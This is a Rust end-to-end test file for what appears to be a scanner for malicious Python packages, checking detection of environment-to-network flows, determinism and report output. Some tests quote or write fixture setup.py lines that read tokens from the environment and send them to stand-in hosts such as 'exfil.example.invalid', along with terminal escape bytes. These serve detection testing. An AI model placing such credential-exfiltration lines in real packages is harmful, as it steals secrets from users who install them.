//! End-to-end scan behaviour: determinism, batch semantics, the novelty pair at the
//! report level, and the JSON schema. Second and fifth tiers of the test contracts.

use std::path::{Path, PathBuf};

use phylaxis_cli::output::{Format, render, to_text};
use phylaxis_cli::{scan_many, scan_one};
use phylaxis_core::{ScanOptions, Verdict};

fn fixture(rel: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../fixtures")
        .join(rel)
}

/// Fixture `benign/setup_py_plain/`: a minimal package with a pure `setup()` call and one
/// module that does nothing suspicious. Zero findings, verdict Clean.
#[test]
fn benign_package_is_clean_with_no_findings() {
    let r = scan_one(&fixture("benign/setup_py_plain"), &ScanOptions::default()).unwrap();
    assert!(r.report.skipped.is_none());
    assert!(r.report.findings.is_empty());
    assert_eq!(r.report.verdict, Verdict::Clean);
    assert_eq!(r.report.risk.value(), 0.0);
    assert!(
        r.report.distribution.is_none(),
        "directories carry no distribution identity"
    );
}

/// THE NOVELTY PAIR at report level (invariant 3). `benign/env_and_net_disjoint/` reads
/// `os.environ` and calls `requests.post` in the same file with no flow between them;
/// `malicious/env_exfil_setup/` sends the value. Same indicators, different verdicts.
#[test]
fn cooccurrence_is_not_a_finding_but_reachability_is() {
    let disjoint = scan_one(
        &fixture("benign/env_and_net_disjoint"),
        &ScanOptions::default(),
    )
    .unwrap();
    assert!(
        disjoint
            .report
            .findings
            .iter()
            .all(|f| f.rule.as_str() != "PHX-EXF-001"),
        "no path, no EXF-001"
    );
    assert_eq!(disjoint.report.verdict, Verdict::Clean);

    let exfil = scan_one(
        &fixture("malicious/env_exfil_setup"),
        &ScanOptions::default(),
    )
    .unwrap();
    let f = exfil
        .report
        .findings
        .iter()
        .find(|f| f.rule.as_str() == "PHX-EXF-001")
        .expect("EXF-001 fires on the real thing");
    assert!(f.evidence.path.is_well_formed());
    assert!(f.evidence.path.steps.len() >= 2);
    assert_eq!(exfil.report.verdict, Verdict::Malicious);
}

/// Determinism (ADR-004): two scans of the same input render byte-identical JSON. The
/// report carries no timing, no timestamps, no cache provenance.
#[test]
fn scan_is_byte_deterministic() {
    let path = fixture("malicious/setup_py_exfil-1.0.tar.gz");
    let a = render(
        &scan_one(&path, &ScanOptions::default()).unwrap().report,
        Format::Json,
    )
    .unwrap();
    let b = render(
        &scan_one(&path, &ScanOptions::default()).unwrap().report,
        Format::Json,
    )
    .unwrap();
    assert_eq!(a, b);
}

/// An sdist carries its distribution identity (name, version, sha256) in the report.
#[test]
fn sdist_report_carries_distribution_identity() {
    let r = scan_one(
        &fixture("malicious/setup_py_exfil-1.0.tar.gz"),
        &ScanOptions::default(),
    )
    .unwrap();
    let d = r.report.distribution.expect("sdist identity");
    assert_eq!(d.name.as_str(), "setup-py-exfil");
    assert_eq!(d.sha256.to_hex().len(), 64);
    assert!(d.size_bytes > 0);
}

/// Batch semantics (ADR-013): results in input order; a missing path is an `Err` in its
/// own slot and does not disturb its neighbours.
#[test]
fn scan_many_preserves_order_and_isolates_failures() {
    let inputs = vec![
        fixture("benign/setup_py_plain"),
        fixture("does/not/exist"),
        fixture("malicious/env_exfil_setup"),
    ];
    let out = scan_many(
        &inputs,
        &ScanOptions {
            jobs: Some(2),
            ..Default::default()
        },
    );
    assert_eq!(out.len(), 3);
    assert!(out[0].as_ref().unwrap().report.findings.is_empty());
    assert!(matches!(out[1], Err(phylaxis_cli::ScanError::NotFound(_))));
    assert_eq!(out[2].as_ref().unwrap().report.verdict, Verdict::Malicious);
}

/// The ablation flag reaches the report: mode A flags the disjoint fixture, D does not.
#[test]
fn analysis_mode_changes_the_verdict_on_the_disjoint_fixture() {
    let path = fixture("benign/env_and_net_disjoint");
    let a = scan_one(
        &path,
        &ScanOptions {
            mode: phylaxis_core::AnalysisMode::FileCooccurrence,
            ..Default::default()
        },
    )
    .unwrap();
    let d = scan_one(&path, &ScanOptions::default()).unwrap();
    assert!(a.report.is_flagged(), "co-occurrence flags it");
    assert!(!d.report.is_flagged(), "reachability does not");
    assert_eq!(a.report.mode.label(), "A");
    assert_eq!(d.report.mode.label(), "D");
}

/// The JSON schema has the keys the evaluation harness reads (EVALUATION.md §8).
#[test]
fn json_report_has_the_harness_keys() {
    let r = scan_one(
        &fixture("malicious/env_exfil_setup"),
        &ScanOptions::default(),
    )
    .unwrap();
    let v: serde_json::Value =
        serde_json::from_str(&render(&r.report, Format::Json).unwrap()).unwrap();
    assert_eq!(v["schema_version"], 2);
    assert!(v["ruleset_version"].as_u64().unwrap() >= 1);
    let f = &v["findings"][0];
    for key in [
        "rule",
        "technique",
        "severity",
        "phase",
        "confidence",
        "score",
        "message",
        "evidence",
    ] {
        assert!(f.get(key).is_some(), "finding is missing {key}");
    }
    assert!(f["evidence"]["path"]["steps"].as_array().unwrap().len() >= 2);
    assert!(v["stats"]["files"].as_u64().unwrap() >= 1);
}

/// The text renderer shows a path per finding, one step per line.
#[test]
fn text_output_lists_path_steps() {
    let r = scan_one(
        &fixture("malicious/env_exfil_setup"),
        &ScanOptions::default(),
    )
    .unwrap();
    let t = to_text(&r.report, false);
    assert!(t.contains("PHX-EXF-001"));
    assert!(t.contains("setup.py:"), "steps name file:line");
}

/// By default the text shows the code the path runs through (ADR-033): the file once, then
/// numbered lines, with `⋮` where the path skips lines. The same code is in the JSON.
#[test]
fn text_output_shows_the_code_of_the_path() {
    let r = scan_one(
        &fixture("malicious/setup_py_exfil"),
        &ScanOptions::default(),
    )
    .unwrap();
    let t = render(&r.report, Format::Text).unwrap();
    let finding: Vec<&str> = t
        .lines()
        .skip_while(|l| !l.contains("PHX-EXF-001"))
        .skip(1)
        .take_while(|l| !l.starts_with("  ["))
        .collect();
    assert_eq!(
        finding,
        [
            "      setup.py",
            "      source    17 │ creds = os.environ.get(\"NPM_TOKEN\", \"\") + \":\" + os.environ.get(\"USER\", \"\")",
            "      transform 19 ⋮     \"http://exfil.example.invalid/c\", data=creds.encode()",
            "      sink      18 ⋮ urllib.request.urlopen(",
        ],
        "{t}"
    );
    let snippets = &r.report.findings[0].evidence.snippets;
    assert_eq!(snippets.len(), 3, "one per distinct line: 17, 19, 18");
    assert!(snippets[0].text.contains("os.environ.get"));
}

/// The code comes from the package, and the package's author chose its bytes: a raw ESC or
/// a bidi override on a line of the path reaches the terminal escaped, never as itself.
#[test]
fn hostile_bytes_in_code_are_escaped_in_text() {
    let dir = std::env::temp_dir().join(format!("phylaxis-e2e-hostile-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("setup.py"),
        "import os, urllib.request\n\
         t = os.environ.get('TOKEN')  # \u{1b}]0;owned\u{7}\u{202e}\n\
         urllib.request.urlopen('http://x.example.invalid/', data=t.encode())\n",
    )
    .unwrap();
    let r = scan_one(&dir, &ScanOptions::default()).unwrap();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(!r.report.findings.is_empty(), "the path is found");
    let t = render(&r.report, Format::Text).unwrap();
    assert!(t.contains(r"\u{1b}]0;owned\u{7}\u{202e}"), "{t}");
    assert!(
        !t.contains(['\u{1b}', '\u{7}', '\u{202e}']),
        "no raw control reaches the terminal"
    );
}
